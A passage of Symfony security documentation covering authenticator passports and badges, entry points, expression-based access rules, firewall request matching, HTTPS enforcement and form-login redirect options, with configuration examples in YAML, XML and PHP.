or if "remember me" functionality should be enabled.

The default
:class:`Symfony\\Component\\Security\\Http\\Authenticator\\Passport\\Passport`
requires a user and some sort of "credentials" (e.g. a password).

Use the
:class:`Symfony\\Component\\Security\\Http\\Authenticator\\Passport\\Badge\\UserBadge`
to attach the user to the passport. The ``UserBadge`` requires a user
identifier (e.g. the username or email), which is used to load the user
using :ref:`the user provider <security-user-providers>`::

    use Symfony\Component\Security\Http\Authenticator\Passport\Badge\UserBadge;

    // ...
    $passport = new Passport(new UserBadge($email), $credentials);

.. note::

    The maximum length allowed for the user identifier is 4096 characters to
    prevent `session storage flooding`_ attacks.

.. note::

    You can optionally pass a user loader as second argument to the
    ``UserBadge``. This callable receives the ``$userIdentifier``
    and must return a ``UserInterface`` object (otherwise a
    ``UserNotFoundException`` is thrown)::

        // src/Security/CustomAuthenticator.php
        namespace App\Security;

        use App\Repository\UserRepository;
        // ...

        class CustomAuthenticator extends AbstractAuthenticator
        {
            public function __construct(
                private UserRepository $userRepository,
            ) {
            }

            public function authenticate(Request $request): Passport
            {
                // ...

                return new Passport(
                    new UserBadge($email, function (string $userIdentifier): ?UserInterface {
                        return $this->userRepository->findOneBy(['email' => $userIdentifier]);
                    }),
                    $credentials
                );
            }
        }

The following credential classes are supported by default:

:class:`Symfony\\Component\\Security\\Http\\Authenticator\\Passport\\Credentials\\PasswordCredentials`
    This requires a plaintext ``$password``, which is validated using the
    :ref:`password encoder configured for the user <security-encoding-user-password>`::

        use Symfony\Component\Security\Http\Authenticator\Passport\Credentials\PasswordCredentials;

        // ...
        return new Passport(new UserBadge($email), new PasswordCredentials($plaintextPassword));

:class:`Symfony\\Component\\Security\\Http\\Authenticator\\Passport\\Credentials\\CustomCredentials`
    Allows a custom closure to check credentials::

        use Symfony\Component\Security\Core\User\UserInterface;
        use Symfony\Component\Security\Http\Authenticator\Passport\Credentials\CustomCredentials;

        // ...
        return new Passport(new UserBadge($email), new CustomCredentials(
            // If this function returns anything else than `true`, the credentials
            // are marked as invalid.
            // The $credentials parameter is equal to the next argument of this class
            function (string $credentials, UserInterface $user): bool {
                return $user->getApiToken() === $credentials;
            },

            // The custom credentials
            $apiToken
        ));

Self Validating Passport
~~~~~~~~~~~~~~~~~~~~~~~~

If you don't need any credentials to be checked (e.g. when using API
tokens), you can use the
:class:`Symfony\\Component\\Security\\Http\\Authenticator\\Passport\\SelfValidatingPassport`.
This class only requires a ``UserBadge`` object and optionally `Passport Badges`_.

Passport Badges
---------------

The ``Passport`` also optionally allows you to add *security badges*.
Badges attach more data to the passport (to extend security). By default,
the following badges are supported:

:class:`Symfony\\Component\\Security\\Http\\Authenticator\\Passport\\Badge\\RememberMeBadge`
    When this badge is added to the passport, the authenticator indicates
    remember me is supported. Whether remember me is actually used depends
    on special ``remember_me`` configuration. Read
    :doc:`/security/remember_me` for more information.

:class:`Symfony\\Component\\Security\\Http\\Authenticator\\Passport\\Badge\\PasswordUpgradeBadge`
    This is used to automatically upgrade the password to a new hash upon
    successful login (if needed). This badge requires the plaintext password and a
    password upgrader (e.g. the user repository). See :ref:`security-password-migration`.

:class:`Symfony\\Component\\Security\\Http\\Authenticator\\Passport\\Badge\\CsrfTokenBadge`
    Automatically validates CSRF tokens for this authenticator during
    authentication. The constructor requires a token ID (unique per form)
    and CSRF token (unique per request). See :doc:`/security/csrf`.

:class:`Symfony\\Component\\Security\\Http\\Authenticator\\Passport\\Badge\\PreAuthenticatedUserBadge`
    Indicates that this user was pre-authenticated (i.e. before Symfony was
    initiated). This skips the
    :doc:`pre-authentication user checker </security/user_checkers>`.

.. note::

    The ``PasswordUpgradeBadge`` is automatically added to the passport if the
    passport has ``PasswordCredentials``.

For instance, if you want to add CSRF to your custom authenticator, you
would initialize the passport like this::

    // src/Service/LoginAuthenticator.php
    namespace App\Service;

    // ...
    use Symfony\Component\Security\Http\Authenticator\AbstractAuthenticator;
    use Symfony\Component\Security\Http\Authenticator\Passport\Badge\CsrfTokenBadge;
    use Symfony\Component\Security\Http\Authenticator\Passport\Badge\UserBadge;
    use Symfony\Component\Security\Http\Authenticator\Passport\Passport;

    class LoginAuthenticator extends AbstractAuthenticator
    {
        public function authenticate(Request $request): Passport
        {
            $password = $request->getPayload()->get('password');
            $username = $request->getPayload()->get('username');
            $csrfToken = $request->getPayload()->get('csrf_token');

            // ... validate no parameter is empty

            return new Passport(
                new UserBadge($username),
                new PasswordCredentials($password),
                [new CsrfTokenBadge('login', $csrfToken)]
            );
        }
    }

Passport Attributes
-------------------

Besides badges, passports can define attributes, which allows the ``authenticate()``
method to store arbitrary information in the passport to access it from other
authenticator methods (e.g. ``createToken()``)::

    // ...
    use Symfony\Component\Security\Http\Authenticator\Passport\Badge\UserBadge;

    class LoginAuthenticator extends AbstractAuthenticator
    {
        // ...

        public function authenticate(Request $request): Passport
        {
            // ... process the request

            $passport = new SelfValidatingPassport(new UserBadge($username), []);

            // set a custom attribute (e.g. scope)
            $passport->setAttribute('scope', $oauthScope);

            return $passport;
        }

        public function createToken(Passport $passport, string $firewallName): TokenInterface
        {
            // read the attribute value
            return new CustomOauthToken($passport->getUser(), $passport->getAttribute('scope'));
        }
    }

.. _`session storage flooding`: https://symfony.com/blog/cve-2016-4423-large-username-storage-in-session
The Entry Point: Helping Users Start Authentication
===================================================

When an unauthenticated user tries to access a protected page, Symfony
gives them a suitable response to let them start authentication (e.g.
redirect to a login form or show a 401 Unauthorized HTTP response for
APIs).

However sometimes, one firewall has multiple ways to authenticate (e.g.
both a form login and a social login). In these cases, it is required to
configure the *authentication entry point*.

You can configure this using the ``entry_point`` setting:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/security.yaml
        security:

            # ...
            firewalls:
                main:
                    # allow authentication using a form or a custom authenticator
                    form_login: ~
                    custom_authenticators:
                        - App\Security\SocialConnectAuthenticator

                    # configure the form authentication as the entry point for unauthenticated users
                    entry_point: form_login

    .. code-block:: xml

        <!-- config/packages/security.xml -->
        <?xml version="1.0" encoding="UTF-8"?>
        <srv:container xmlns="http://symfony.com/schema/dic/security"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:srv="http://symfony.com/schema/dic/services"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/security
                https://symfony.com/schema/dic/security/security-1.0.xsd">

            <config>
                <!-- ... -->

                <!-- entry-point: configure the form authentication as the entry
                                  point for unauthenticated users -->
                <firewall name="main"
                    entry-point="form_login"
                >
                    <!-- allow authentication using a form or a custom authenticator -->
                    <form-login/>
                    <custom-authenticator>App\Security\SocialConnectAuthenticator</custom-authenticator>
                </firewall>
            </config>
        </srv:container>

    .. code-block:: php

        // config/packages/security.php
        use App\Security\SocialConnectAuthenticator;
        use Symfony\Config\SecurityConfig;

        return static function (SecurityConfig $security): void {
            $security->enableAuthenticatorManager(true);
            // ....

            // allow authentication using a form or HTTP basic
            $mainFirewall = $security->firewall('main');
            $mainFirewall
                ->formLogin()
                ->customAuthenticators([SocialConnectAuthenticator::class])

                // configure the form authentication as the entry point for unauthenticated users
                ->entryPoint('form_login');
            ;
        };

.. note::

    You can also create your own authentication entry point by creating a
    class that implements
    :class:`Symfony\\Component\\Security\\Http\\EntryPoint\\AuthenticationEntryPointInterface`.
    You can then set ``entry_point`` to the service id (e.g.
    ``entry_point: App\Security\CustomEntryPoint``)

Multiple Authenticators with Separate Entry Points
--------------------------------------------------

However, there are use cases where you have authenticators that protect
different parts of your application. For example, you have a login form
that protects the main website and API end-points used by external parties
protected by API keys.

As you can only configure one entry point per firewall, the solution is to
split the configuration into two separate firewalls:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/security.yaml
        security:
            # ...
            firewalls:
                api:
                    pattern: ^/api/
                    custom_authenticators:
                        - App\Security\ApiTokenAuthenticator
                main:
                    lazy: true
                    form_login: ~

            access_control:
                - { path: '^/login', roles: PUBLIC_ACCESS }
                - { path: '^/api', roles: ROLE_API_USER }
                - { path: '^/', roles: ROLE_USER }

    .. code-block:: xml

        <!-- config/packages/security.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <srv:container xmlns="http://symfony.com/schema/dic/security"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:srv="http://symfony.com/schema/dic/services"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/security
                https://symfony.com/schema/dic/security/security-1.0.xsd">

            <config>
                <!-- ... -->
                <firewall name="api" pattern="^/api/">
                    <custom-authenticator>App\Security\ApiTokenAuthenticator</custom-authenticator>
                </firewall>

                <firewall name="main" anonymous="true" lazy="true">
                    <form-login/>
                </firewall>

                <rule path="^/login" role="PUBLIC_ACCESS"/>
                <rule path="^/api" role="ROLE_API_USER"/>
                <rule path="^/" role="ROLE_USER"/>
            </config>
        </srv:container>

    .. code-block:: php

        // config/packages/security.php
        use App\Security\ApiTokenAuthenticator;
        use App\Security\LoginFormAuthenticator;
        use Symfony\Config\SecurityConfig;

        return static function (SecurityConfig $security): void {
            $apiFirewall = $security->firewall('api');
            $apiFirewall
                ->pattern('^/api')
                ->customAuthenticators([ApiTokenAuthenticator::class])
            ;

            $mainFirewall = $security->firewall('main');
            $mainFirewall
                ->lazy(true)
                ->formLogin();

            $accessControl = $security->accessControl();
            $accessControl->path('^/login')->roles(['PUBLIC_ACCESS']);
            $accessControl->path('^/api')->roles(['ROLE_API_USER']);
            $accessControl->path('^/')->roles(['ROLE_USER']);
        };
Using Expressions in Security Access Controls
=============================================

.. seealso::

    The best solution for handling complex authorization rules is to use
    the :doc:`Voter System </security/voters>`.

In addition to security roles like ``ROLE_ADMIN``, the ``isGranted()`` method
and ``#[IsGranted()]`` attribute also accept an
:class:`Symfony\\Component\\ExpressionLanguage\\Expression` object:

.. configuration-block::

    .. code-block:: php-attributes

        // src/Controller/MyController.php
        namespace App\Controller;

        use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
        use Symfony\Component\ExpressionLanguage\Expression;
        use Symfony\Component\HttpFoundation\Response;
        use Symfony\Component\Security\Http\Attribute\IsGranted;

        class MyController extends AbstractController
        {
            #[IsGranted(new Expression('is_granted("ROLE_ADMIN") or is_granted("ROLE_MANAGER")'))]
            public function show(): Response
            {
                // ...
            }

            #[IsGranted(new Expression(
                '"ROLE_ADMIN" in role_names or (is_authenticated() and user.isSuperAdmin())'
            ))]
            public function edit(): Response
            {
                // ...
            }
        }

    .. code-block:: php

        // src/Controller/MyController.php
        namespace App\Controller;

        use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
        use Symfony\Component\ExpressionLanguage\Expression;
        use Symfony\Component\HttpFoundation\Response;

        class MyController extends AbstractController
        {
            public function show(): Response
            {
                $this->denyAccessUnlessGranted(new Expression(
                    'is_granted("ROLE_ADMIN") or is_granted("ROLE_MANAGER")'
                ));

                // ...
            }

            public function edit(): Response
            {
                $this->denyAccessUnlessGranted(new Expression(
                    '"ROLE_ADMIN" in role_names or (is_authenticated() and user.isSuperAdmin())'
                ));

                // ...
            }
        }

In this example, if the current user has ``ROLE_ADMIN`` or if the current
user object's ``isSuperAdmin()`` method returns ``true``, then access will
be granted (note: your User object may not have an ``isSuperAdmin()`` method,
that method is invented for this example).

.. _security-expression-variables:

The security expression must use any valid :doc:`expression language syntax </reference/formats/expression_language>`
and can use any of these variables created by Symfony:

``user``
    An instance of :class:`Symfony\\Component\\Security\\Core\\User\\UserInterface`
    that represents the current user or ``null`` if you're not authenticated.
``role_names``
    An array with the string representation of the roles the user has. This array
    includes any roles granted indirectly via the :ref:`role hierarchy <security-role-hierarchy>` but it
    does not include the ``IS_AUTHENTICATED_*`` attributes (see the functions below).
``object``
    The object (if any) that's passed as the second argument to ``isGranted()``.
``subject``
    It stores the same value as ``object``, so they are equivalent.
``token``
    The token object.
``trust_resolver``
    The :class:`Symfony\\Component\\Security\\Core\\Authentication\\AuthenticationTrustResolverInterface`,
    object: you'll probably use the ``is_*()`` functions below instead.

Additionally, you have access to a number of functions inside the expression:

``is_authenticated()``
    Returns ``true`` if the user is authenticated via "remember-me" or authenticated
    "fully" - i.e. returns true if the user is "logged in".
``is_remember_me()``
    Similar, but not equal to ``IS_AUTHENTICATED_REMEMBERED``, see below.
``is_fully_authenticated()``
    Equal to checking if the user has the ``IS_AUTHENTICATED_FULLY`` role.
``is_granted()``
    Checks if the user has the given permission. Optionally accepts a
    second argument with the object where permission is checked on. It's
    equivalent to using the :ref:`isGranted() method <security-isgranted>`
    from the security service.

.. sidebar:: ``is_remember_me()`` is different than checking ``IS_AUTHENTICATED_REMEMBERED``

    The ``is_remember_me()`` and ``is_fully_authenticated()`` functions are *similar*
    to using ``IS_AUTHENTICATED_REMEMBERED`` and ``IS_AUTHENTICATED_FULLY``
    with the ``isGranted()`` function - but they are **not** the same. The
    following controller snippet shows the difference::

        use Symfony\Component\ExpressionLanguage\Expression;
        use Symfony\Component\Security\Core\Authorization\AuthorizationCheckerInterface;
        // ...

        public function index(AuthorizationCheckerInterface $authorizationChecker): Response
        {
            $access1 = $authorizationChecker->isGranted('IS_AUTHENTICATED_REMEMBERED');

            $access2 = $authorizationChecker->isGranted(new Expression(
                'is_remember_me() or is_fully_authenticated()'
            ));
        }

    Here, ``$access1`` and ``$access2`` will be the same value. Unlike the
    behavior of ``IS_AUTHENTICATED_REMEMBERED`` and ``IS_AUTHENTICATED_FULLY``,
    the ``is_remember_me()`` function *only* returns true if the user is authenticated
    via a remember-me cookie and ``is_fully_authenticated()`` *only* returns
    true if the user has actually logged in during this session (i.e. is
    full-fledged).

In case of the ``#[IsGranted()]`` attribute, the subject can also be an
:class:`Symfony\\Component\\ExpressionLanguage\\Expression` object::

    // src/Controller/MyController.php
    namespace App\Controller;

    use App\Entity\Post;
    use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
    use Symfony\Component\ExpressionLanguage\Expression;
    use Symfony\Component\HttpFoundation\Response;
    use Symfony\Component\Security\Http\Attribute\IsGranted;

    class MyController extends AbstractController
    {
        #[IsGranted(
            attribute: new Expression('user === subject'),
            subject: new Expression('args["post"].getAuthor()'),
        )]
        public function index(Post $post): Response
        {
            // ...
        }
    }

In this example, we fetch the author of the post and use it as the subject. If the subject matches
the current user, then access will be granted.

The subject may also be an array where the key can be used as an alias for the result of an expression::

    #[IsGranted(
        attribute: new Expression('user === subject["author"] and subject["post"].isPublished()'),
        subject: [
            'author' => new Expression('args["post"].getAuthor()'),
            'post',
        ],
    )]
    public function index(Post $post): Response
    {
        // ...
    }

Here, access will be granted if the author matches the current user
and the post's ``isPublished()`` method returns ``true``.

You can also use the current request as the subject::

    #[IsGranted(
        attribute: '...',
        subject: new Expression('request'),
    )]
    public function index(): Response
    {
        // ...
    }

Inside the subject's expression, you have access to two variables:

``request``
    The :ref:`Symfony Request <component-http-foundation-request>` object that
    represents the current request.
``args``
    An array of controller arguments that are passed to the controller.

Learn more
----------

* :doc:`/service_container/expression_language`
* :doc:`/reference/constraints/Expression`
How to Restrict Firewalls to a Request
======================================

When using the Security component, firewalls will decide whether they handle a
request based on the result of a request matcher: the first firewall matching
the request will handle it.

The last firewall can be configured without any matcher to handle every incoming
request.

Restricting by Configuration
----------------------------

Most of the time you don't need to create matchers yourself as Symfony can do it
for you based on the firewall configuration.

.. note::

    You can use any of the following restrictions individually or mix them
    together to get your desired firewall configuration.

Restricting by Path
~~~~~~~~~~~~~~~~~~~

This is the default restriction and restricts a firewall to only be initialized
if the request path matches the configured ``pattern``.

.. configuration-block::

    .. code-block:: yaml

        # config/packages/security.yaml

        # ...
        security:
            firewalls:
                secured_area:
                    pattern: ^/admin
                    # ...

    .. code-block:: xml

        <!-- config/packages/security.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <srv:container xmlns="http://symfony.com/schema/dic/security"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:srv="http://symfony.com/schema/dic/services"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/security
                https://symfony.com/schema/dic/security/security-1.0.xsd">

            <config>
                <!-- ... -->
                <firewall name="secured_area" pattern="^/admin">
                    <!-- ... -->
                </firewall>
            </config>
        </srv:container>

    .. code-block:: php

        // config/packages/security.php
        use Symfony\Config\SecurityConfig;

        return static function (SecurityConfig $security): void {
            // ....

            $security->firewall('secured_area')
                ->pattern('^/admin')
                // ...
            ;
        };

The ``pattern`` is a regular expression. In this example, the firewall will only be
activated if the path starts (due to the ``^`` regex character) with ``/admin``. If
the path does not match this pattern, the firewall will not be activated and subsequent
firewalls will have the opportunity to be matched for this request.

Restricting by Host
~~~~~~~~~~~~~~~~~~~

If matching against the ``pattern`` only is not enough, the request can also be matched against
``host``. When the configuration option ``host`` is set, the firewall will be restricted to
only initialize if the host from the request matches against the configuration.

.. configuration-block::

    .. code-block:: yaml

        # config/packages/security.yaml

        # ...
        security:
            firewalls:
                secured_area:
                    host: ^admin\.example\.com$
                    # ...

    .. code-block:: xml

        <!-- config/packages/security.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <srv:container xmlns="http://symfony.com/schema/dic/security"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:srv="http://symfony.com/schema/dic/services"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/security
                https://symfony.com/schema/dic/security/security-1.0.xsd">

            <config>
                <!-- ... -->
                <firewall name="secured_area" host="^admin\.example\.com$">
                    <!-- ... -->
                </firewall>
            </config>
        </srv:container>

    .. code-block:: php

        // config/packages/security.php
        use Symfony\Config\SecurityConfig;

        return static function (SecurityConfig $security): void {
            // ....

            $security->firewall('secured_area')
                ->host('^admin\.example\.com$')
                // ...
            ;
        };

The ``host`` (like the ``pattern``) is a regular expression. In this example,
the firewall will only be activated if the host is equal exactly (due to
the ``^`` and ``$`` regex characters) to the hostname ``admin.example.com``.
If the hostname does not match this pattern, the firewall will not be activated
and subsequent firewalls will have the opportunity to be matched for this
request.

Restricting by HTTP Methods
~~~~~~~~~~~~~~~~~~~~~~~~~~~

The configuration option ``methods`` restricts the initialization of the firewall to
the provided HTTP methods.

.. configuration-block::

    .. code-block:: yaml

        # config/packages/security.yaml

        # ...
        security:
            firewalls:
                secured_area:
                    methods: [GET, POST]
                    # ...

    .. code-block:: xml

        <!-- config/packages/security.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <srv:container xmlns="http://symfony.com/schema/dic/security"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:srv="http://symfony.com/schema/dic/services"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/security
                https://symfony.com/schema/dic/security/security-1.0.xsd">

            <config>
                <!-- ... -->
                <firewall name="secured_area" methods="GET,POST">
                    <!-- ... -->
                </firewall>
            </config>
        </srv:container>

    .. code-block:: php

        // config/packages/security.php
        use Symfony\Config\SecurityConfig;

        return static function (SecurityConfig $security): void {
            // ....

            $security->firewall('secured_area')
                ->methods(['GET', 'POST'])
                // ...
            ;
        };

In this example, the firewall will only be activated if the HTTP method of the
request is either ``GET`` or ``POST``. If the method is not in the array of the
allowed methods, the firewall will not be activated and subsequent firewalls will again
have the opportunity to be matched for this request.

Restricting by Service
----------------------

If the above options don't fit your needs you can configure any service implementing
:class:`Symfony\\Component\\HttpFoundation\\RequestMatcherInterface` as ``request_matcher``.

.. configuration-block::

    .. code-block:: yaml

        # config/packages/security.yaml

        # ...
        security:
            firewalls:
                secured_area:
                    request_matcher: App\Security\CustomRequestMatcher
                    # ...

    .. code-block:: xml

        <!-- config/packages/security.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <srv:container xmlns="http://symfony.com/schema/dic/security"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:srv="http://symfony.com/schema/dic/services"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/security
                https://symfony.com/schema/dic/security/security-1.0.xsd">

            <config>
                <!-- ... -->
                <firewall name="secured_area" request-matcher="App\Security\CustomRequestMatcher">
                    <!-- ... -->
                </firewall>
            </config>
        </srv:container>

    .. code-block:: php

        // config/packages/security.php
        use App\Security\CustomRequestMatcher;
        use Symfony\Config\SecurityConfig;

        return static function (SecurityConfig $security): void {
            // ....

            $security->firewall('secured_area')
                ->requestMatcher(CustomRequestMatcher::class)
                // ...
            ;
        };
How to Force HTTPS or HTTP for different URLs
=============================================

.. tip::

    The *best* policy is to force ``https`` on all URLs, which can be done via
    your web server configuration or ``access_control``.

You can force areas of your site to use the HTTPS protocol in the security
config. This is done through the ``access_control`` rules using the ``requires_channel``
option. To enforce HTTPS on all URLs, add the ``requires_channel`` config to every
access control:

.. configuration-block::

        .. code-block:: yaml

            # config/packages/security.yaml
            security:
                # ...

                access_control:
                    - { path: '^/secure', roles: ROLE_ADMIN, requires_channel: https }
                    - { path: '^/login', roles: PUBLIC_ACCESS, requires_channel: https }
                    # catch all other URLs
                    - { path: '^/', roles: PUBLIC_ACCESS, requires_channel: https }

        .. code-block:: xml

            <!-- config/packages/security.xml -->
            <?xml version="1.0" encoding="UTF-8" ?>
            <srv:container xmlns="http://symfony.com/schema/dic/security"
                xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                xmlns:srv="http://symfony.com/schema/dic/services"
                xsi:schemaLocation="http://symfony.com/schema/dic/services
                    https://symfony.com/schema/dic/services/services-1.0.xsd
                    http://symfony.com/schema/dic/security
                    https://symfony.com/schema/dic/security/security-1.0.xsd">

                <config>
                    <!-- ... -->

                    <rule path="^/secure" role="ROLE_ADMIN" requires-channel="https"/>
                    <rule path="^/login" role="PUBLIC_ACCESS" requires-channel="https"/>
                    <rule path="^/" role="PUBLIC_ACCESS" requires-channel="https"/>
                </config>
            </srv:container>

        .. code-block:: php

            // config/packages/security.php
            use Symfony\Config\SecurityConfig;

            return static function (SecurityConfig $security): void {
                // ....

                $security->accessControl()
                    ->path('^/secure')
                    ->roles(['ROLE_ADMIN'])
                    ->requiresChannel('https')
                ;

                $security->accessControl()
                    ->path('^/login')
                    ->roles(['PUBLIC_ACCESS'])
                    ->requiresChannel('https')
                ;

                $security->accessControl()
                    ->path('^/')
                    ->roles(['PUBLIC_ACCESS'])
                    ->requiresChannel('https')
                ;
            };

To make life easier while developing, you can also use an environment variable,
like ``requires_channel: '%env(REQUIRED_SCHEME)%'``. In your ``.env`` file, set
``REQUIRED_SCHEME`` to ``http`` by default, but override it to ``https`` on production.

See :doc:`/security/access_control` for more details about ``access_control``
in general.

.. note::

    An alternative way to enforce HTTP or HTTPS is to use
    :ref:`the scheme option <routing-force-https>` of a route or group of routes.

.. note::

    Forcing HTTPS while using a reverse proxy or load balancer requires a proper
    configuration to avoid infinite redirect loops; see :doc:`/deployment/proxies`
    for more details.
Customizing the Form Login Authenticator Responses
==================================================

The form login authenticator creates a login form where users authenticate
using an identifier (e.g. email address or username) and a password. In
:ref:`security-form-login` the usage of this authenticator is explained.

Redirecting after Success
-------------------------

By default, the form will redirect to the URL the user requested (i.e. the URL
which triggered the login form being shown). For example, if the user requested
``http://www.example.com/admin/post/18/edit``, then after they have successfully
logged in, they will be sent back to ``http://www.example.com/admin/post/18/edit``.

This is done by storing the requested URL in the session. If no URL is present
in the session (perhaps the user went directly to the login page), then the user
is redirected to ``/`` (i.e. the homepage). You can change this behavior in
several ways.

Changing the default Page
~~~~~~~~~~~~~~~~~~~~~~~~~

Define the ``default_target_path`` option to change the page where the user
is redirected to if no previous page was stored in the session. The value can be
a relative/absolute URL or a Symfony route name:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/security.yaml
        security:
            # ...

            firewalls:
                main:
                    form_login:
                        # ...
                        default_target_path: after_login_route_name

    .. code-block:: xml

        <!-- config/packages/security.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <srv:container xmlns="http://symfony.com/schema/dic/security"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:srv="http://symfony.com/schema/dic/services"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/security
                https://symfony.com/schema/dic/security/security-1.0.xsd">

            <config>
                <!-- ... -->

                <firewall name="main">
                    <form-login default-target-path="after_login_route_name"/>
                </firewall>
            </config>
        </srv:container>

    .. code-block:: php

        // config/packages/security.php
        use Symfony\Config\SecurityConfig;

        return static function (SecurityConfig $security): void {
            // ...

            $security->firewall('main')
                // ...
                ->formLogin()
                    // ...
                    ->defaultTargetPath('after_login_route_name')
            ;
        };

Always Redirect to the default Page
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Define the ``always_use_default_target_path`` boolean option to ignore the
previously requested URL and always redirect to the default page:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/security.yaml
        security:
            # ...

            firewalls:
                main:
                    form_login:
                        # ...
                        always_use_default_target_path: true

    .. code-block:: xml

        <!-- config/packages/security.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <srv:container xmlns="http://symfony.com/schema/dic/security"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:srv="http://symfony.com/schema/dic/services"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/security
                https://symfony.com/schema/dic/security/security-1.0.xsd">

            <config>
                <!-- ... -->

                <firewall name="main">
                    <!-- ... -->
                    <form-login always-use-default-target-path="true"/>
                </firewall>
            </config>
        </srv:container>

    .. code-block:: php

        // config/packages/security.php
        use Symfony\Config\SecurityConfig;

        return static function (SecurityConfig $security): void {
            // ...

            $security->firewall('main')
                // ...
                ->formLogin()
                    // ...
                    ->alwaysUseDefaultTargetPath(true)
            ;
        };

.. _control-the-redirect-url-from-inside-the-form:

Control the Redirect Using Request Parameters
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

The URL to redirect to after the login can be dynamically defined using the ``_target_path``
parameter of the GET or POST request. Its value must be a relative or absolute
URL, not a Symfony route name.

For GET, use a query string parameter:

.. code-block:: text

    http://example.com/some/path?_target_path=/dashboard

For POST, use a hidden form field:

.. code-block:: html+twig

    {# templates/login/index.html.twig #}
    <form action="{{ path('app_login') }}" method="post">
        {# ... #}

        <input type="hidden" name="_target_path" value="{{ path('account') }}">
        <input type="submit" name="login">
    </form>

Using the Referring URL
~~~~~~~~~~~~~~~~~~~~~~~

In case no previous URL was stored in the session and no ``_target_path``
parameter is included in the request, you may use the value of the
``HTTP_REFERER`` header instead, as this will often be the same. Define the
``use_referer`` boolean option to enable this behavior:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/security.yaml
        security:
            # ...

            firewalls:
                main:
                    # ...
                    form_login:
                        # ...
                        use_referer: true

    .. code-block:: xml

        <!-- config/packages/security.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <srv:container xmlns="http://symfony.com/schema/dic/security"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:srv="http://symfony.com/schema/dic/services"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/security
                https://symfony.com/schema/dic/security/security-1.0.xsd">

            <config>
                <!-- ... -->

                <firewall name="main">
                    <!-- ... -->
                    <form-login use-referer="true"/>
                </firewall>
            </config>
        </srv:container>

    .. code-block:: php

        // config/packages/security.php
        use Symfony\Config\SecurityConfig;

        return static function (SecurityConfig $security): void {
            // ...

            $security->firewall('main')
                // ...
                ->formLogin()
                    // ...
                    ->useReferer(true)
            ;
        };

.. note::

    The referrer URL is only used when it is different from the URL generated by
    the ``login_path`` route to avoid a redirection loop.

.. _redirecting-on-login-failure:

Redirecting after Failure
-------------------------

After a failed login (e.g. an invalid username or password was submitted), the
user is redirected back to the login form itself. Use the ``failure_path``
option to define a new target via a relative/absolute URL or a Symfony route name:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/security.yaml
        security:
            # ...

            firewalls:
                main:
                    # ...
                    form_login:
                        # ...
                        failure_path: login_failure_route_name

    .. code-block:: xml

        <!-- config/packages/security.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <srv:container xmlns="http://symfony.com/schema/dic/security"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:srv="http://symfony.com/schema/dic/services"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/security
                https://symfony.com/schema/dic/security/security-1.0.xsd">

            <config>
                <!-- ... -->

                <firewall name="main">
                    <!-- ... -->
                    <form-login failure-path="login_failure_route_name"/>
                </firewall>
            </config>
        </srv:container>

    .. code-block:: php

        // config/packages/security.php
        use Symfony\Config\SecurityConfig;

        return static function (SecurityConfig $security): void {
            // ...

            $security->firewall('main')
                // ...
                ->formLogin()
                    // ...
                    ->failurePath('login_failure_route_name')
            ;
        };

This option can also be set via the ``_failure_path`` request parameter:

.. code-block:: text

    http://example.com/some/path?_failure_path=/forgot-password

.. code-block:: html+twig

    {# templates/security/login.html.twig #}
    <form action="{{ path('login') }}" method="post">
        {# ... #}

        <input type="hidden" name="_failure_path" value="{{ path('forgot_password') }}">
        <input type="submit" name="login">
    </form>

Customizing the Target and Failure Request Parameters
